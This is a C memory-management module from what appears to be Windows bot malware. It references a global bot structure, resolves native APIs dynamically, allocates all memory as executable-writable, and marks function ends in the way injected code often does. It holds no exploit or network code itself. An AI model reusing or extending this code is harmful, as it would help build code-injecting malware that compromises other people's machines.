#include <Windows.h>
#include "bot_structs.h"
#include "mem.h"

extern bot_t bot;

static HANDLE hHeap;

void WINAPI memInit(void)
{

}

LPVOID WINAPI memalloc(DWORD dwSize)
{
	LPVOID p;

	p = NULL;

	if(CWA(NtAllocateVirtualMemory)(CURRENT_PROCESS, &p, 0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) >= 0)
	{
		memzero(p, dwSize);
	}

	return p;
}
DWORD WINAPI memallocEnd(void) { return 0; }

void WINAPI memfree(void* pData)
{
	DWORD dwFree;

	if (pData)
	{
		dwFree = 0;
		CWA(NtFreeVirtualMemory)(CURRENT_PROCESS, &pData, &dwFree, MEM_RELEASE);
	}
}
DWORD WINAPI memfreeEnd(void) { return 0; }

void WINAPI memzero(LPVOID lpData, DWORD dwLength)
{
	DWORD i;
	char* pszData;

	if ((pszData = (char*)lpData) == NULL)
		return;

	for (i = 0; i < dwLength; i++)
		pszData[i] = 0x00;
}
DWORD WINAPI memzeroEnd(void) { return 0; }

void WINAPI memcopy(void* pDestination, const void* pSource, DWORD dwSize)
{
	DWORD i;

	for (i = 0; i < dwSize; i++)
	{
		((LPBYTE)pDestination)[i] = ((LPBYTE)pSource)[i];
	}
}
DWORD WINAPI memcopyEnd(void) { return 0; }

//void memcopy_reverse(void* pDestination, const void* pSource, DWORD dwSize)
//{
//	DWORD i;
//
//	i = 0;
//
//	while(dwSize > 0)
//	{
//		((LPBYTE)pDestination)[i] = ((LPBYTE)pSource)[dwSize - 1];
//
//		i++;
//		dwSize--;
//	}
//}

BOOL WINAPI memreallocEx(void *old, DWORD size)
{
	if (size == 0)
	{
		memfree(*(LPBYTE *)old);
		*(LPBYTE *)old = NULL;
	}
	else
	{
		register void *p = memrealloc(*(LPBYTE *)old, size);
		if (p == NULL) return FALSE;
		*(LPBYTE *)old = (LPBYTE)p;
	}

	return TRUE;
}

DWORD GetMemSize(LPVOID lpAddr)
{
	MEMORY_BASIC_INFORMATION MemInfo;

	if (!lpAddr)
	{
		return 0;
	}

	bot.api.pVirtualQuery(lpAddr, &MemInfo, sizeof(MEMORY_BASIC_INFORMATION));

	return MemInfo.RegionSize;
}

LPVOID WINAPI memrealloc(void *old, SIZE_T size)
{
	LPVOID NewAddr;
	DWORD PrevLen;

	PrevLen = 0;

	if (old)
		PrevLen = GetMemSize(old);

	NewAddr = NULL;
	if (size > 0)
	{
		NewAddr = memalloc(size);
		if (old && NewAddr && PrevLen)
		{
			if (size < PrevLen)
				PrevLen = size;
			memcopy(NewAddr, old, PrevLen);
		}
	}

	if (old != NULL)
		memfree(old);

	return NewAddr;
}